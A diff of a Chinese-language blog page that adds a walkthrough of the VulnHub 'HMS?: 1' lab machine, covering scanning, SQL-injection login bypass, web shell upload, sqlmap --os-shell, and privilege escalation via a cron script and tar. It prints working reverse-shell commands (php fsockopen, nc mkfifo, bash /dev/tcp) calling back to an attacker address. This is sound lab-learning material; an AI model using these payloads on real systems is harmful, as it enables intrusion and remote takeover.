@@ -13,17 +13,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <meta name="format-detection" content="telphone=no, email=no" />
   
-    <meta name="keywords" content="" />
+    <meta name="keywords" content="vulnhub" />
   
-  <meta property="og:type" content="article">
+  <meta name="description" content="netdiscover和nmap开路 12netdiscover -i eth0nmap -p- -sV -T5 192.168.0.102  访问7080端口,源代码查看作者信息，去找cms的source code read me里有默认账号密码登录信息 用默认账号密码直接登录 密码绕过的一种方法，删掉type的mail类型，就不会检查了 12&#39; or 1&#x3D;1#&#39; or">
+<meta property="og:type" content="article">
 <meta property="og:title" content="vulnhub HMS?: 1">
 <meta property="og:url" content="http://example.com/2021/09/02/vulnhub-HMS-1/index.html">
 <meta property="og:site_name" content="Facker007&#39;s blog">
+<meta property="og:description" content="netdiscover和nmap开路 12netdiscover -i eth0nmap -p- -sV -T5 192.168.0.102  访问7080端口,源代码查看作者信息，去找cms的source code read me里有默认账号密码登录信息 用默认账号密码直接登录 密码绕过的一种方法，删掉type的mail类型，就不会检查了 12&#39; or 1&#x3D;1#&#39; or">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/a.jpg">
-<meta property="article:published_time" content="2021-09-02T03:23:21.000Z">
-<meta property="article:modified_time" content="2021-09-02T03:23:21.107Z">
+<meta property="article:published_time" content="2021-09-02T03:23:00.000Z">
+<meta property="article:modified_time" content="2021-09-08T04:33:48.993Z">
 <meta property="article:author" content="Facker007">
+<meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/a.jpg">
 <meta name="twitter:site" content="@null">
@@ -121,7 +124,7 @@
                         <i class="fa fa-edit"></i> 
                         
                         
-                            0
+                            1447
                         
                         字
                         
@@ -130,11 +133,43 @@
             </header>
             <div class="kratos-post-content">
                 <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                    本文最后编辑于 <time datetime="1630553001107"></time> 前，其中的内容可能需要更新。
+                    本文最后编辑于 <time datetime="1631075628993"></time> 前，其中的内容可能需要更新。
                 </div>
                 
                 <hr />
-                
+                <p>netdiscover和nmap开路</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br><span class="line">nmap -p- -sV -T5 192.168.0.102</span><br></pre></td></tr></table></figure>
+<p><img src="1.png" alt="1.png"></p>
+<p>访问7080端口,源代码查看作者信息，去找cms的source code<br><img src="2.png" alt="2.png"></p>
+<p>read me里有默认账号密码登录信息<br><img src="3.png" alt="3.png"></p>
+<p>用默认账号密码直接登录<br><img src="4.png" alt="4.png"></p>
+<p>密码绕过的一种方法，删掉type的mail类型，就不会检查了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#x3D;1#</span><br><span class="line">&#39; or 1&#x3D;1 -- </span><br></pre></td></tr></table></figure>
+<p><img src="5.png" alt="5.png"></p>
+<p>grep找upload，寻找文件上传的点<br><img src="6.png" alt="6.png"></p>
+<p>msfvenom生成在上传，但反弹过来执行不了命令<br><img src="7.png" alt="7.png"></p>
+<p>上传<br><img src="8.png" alt="8.png"><br>反弹<br><img src="9.png" alt="9.png"></p>
+<p>命令执行的方法，反弹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.102:7080&#x2F;uploadImage&#x2F;Logo&#x2F;one.php?cmd&#x3D;php+-r+%27$sock%3dfsockopen(%22192.168.0.105%22,1234)%3bexec(%22&#x2F;bin&#x2F;sh+-i+%3C%263+%3E%263+2%3E%263%22)%3b%27</span><br></pre></td></tr></table></figure>
+<p><img src="10.png" alt="10.png"></p>
+<p>另一种sql的方法拿shell<br><img src="11.png" alt="11.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.0.102:7080&#x2F;patientreport.php?patientid&#x3D;1&quot; --cookie&#x3D;&#39;PHPSESSID&#x3D;3eaaa805aeded111845dfc6ff6db3430&#39; -v3  --os-shell</span><br></pre></td></tr></table></figure>
+<p><img src="11-2.png" alt="11-2.png"></p>
+<p><a target="_blank" rel="noopener" href="https://www.revshells.com/">payload生成网站</a></p>
+<p>编码的话，要对特殊符号也要编码。</p>
+<p><a target="_blank" rel="noopener" href="https://www.bejson.com/enc/urlencode/">encodeurl</a><br><img src="12.png" alt="12.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.102:7080&#x2F;tmpbycat.php?cmd&#x3D;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.0.105%201234%20%3E%2Ftmp%2Ff</span><br><span class="line"></span><br><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+<p><img src="13.png" alt="13.png"></p>
+<p>bash提权，发现是eren用户，查看crontab文件。发现有个脚本隔5分钟会运行一次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -4000 -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p><img src="14.png" alt="14.png"></p>
+<p>写入反弹shell的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.105&#x2F;1234 0&gt;&amp;1&quot; &gt;&gt; &#x2F;home&#x2F;eren&#x2F;backup.sh</span><br><span class="line"></span><br><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure>
+<p>前面那句写错了，又写了句进去<br><img src="15.png" alt="15.png"></p>
+<p>sudo -l看到tar<br>打开<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/tar/">gtfobins</a></p>
+<p>找到root.txt(final flag)<br><img src="16.png" alt="16.png"></p>
+<p>其他参考：<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=MDpBC81i7qg">1.</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=MDpBC81i7qg">https://www.youtube.com/watch?v=MDpBC81i7qg</a><br><a target="_blank" rel="noopener" href="https://nepcodex.com/2021/08/writeup-of-hms-from-vulnhub-walkthrough/">2.</a><br><a target="_blank" rel="noopener" href="https://nepcodex.com/2021/08/writeup-of-hms-from-vulnhub-walkthrough/">https://nepcodex.com/2021/08/writeup-of-hms-from-vulnhub-walkthrough/</a></p>
+
             </div>
             
                 <div class="kratos-copyright text-center clearfix">
@@ -201,7 +236,11 @@
             const twitterBase   = "https://twitter.com/intent/tweet?";
             const hostUrl       = "http://example.com/2021/09/02/vulnhub-HMS-1/";
             const title         = "「vulnhub HMS?: 1」";
-            const excerpt       = ``;
+            const excerpt       = `netdiscover和nmap开路
+12netdiscover -i eth0nmap -p- -sV -T5 192.168.0.102
+
+访问7080端口,源代码查看作者信息，去找cms的source code
+read me里...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -220,10 +259,10 @@
                 <div class="footer-tag clearfix">
                     <div class="pull-left">
                     <i class="fa fa-tags"></i>
-                        
+                        <a class="tag-none-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>
                     </div>
                     <div class="pull-date">
-                    <span>最后编辑：2021-09-02</span>
+                    <span>最后编辑：2021-09-08</span>
                     </div>
                 </div>
             </footer>
@@ -235,6 +274,10 @@
                     <a title=" 墨者学院-网络安全类全解（Writeup）" href="/2021/08/31/墨者学院-网络安全类全解（Writeup）/">&lt; 上一篇</a>
                 </div>
                 
+                
+                <div class="nav-next clearfix">
+                    <a title=" C语言之重新入门到入土" href="/2021/09/05/C语言之重新入门到入土/">下一篇 &gt;</a>
+                </div>
                 
             </nav>
         
@@ -283,6 +326,12 @@
         
           
           
+            <a class="list-group-item" href="/2021/09/05/C%E8%AF%AD%E8%A8%80%E4%B9%8B%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/"><i class="fa  fa-book"></i> C语言之重新入门到入土</a>
+            
+          
+        
+          
+          
             <a class="list-group-item" href="/2021/09/02/vulnhub-HMS-1/"><i class="fa  fa-book"></i> vulnhub HMS?: 1</a>
             
           
@@ -306,11 +355,7 @@
           
         
           
-          
-            <a class="list-group-item" href="/2021/08/23/vulnhub-Mr-Robot-1/"><i class="fa  fa-book"></i> vulnhub Mr Robot:1</a>
             
-          
-        
           
             
           
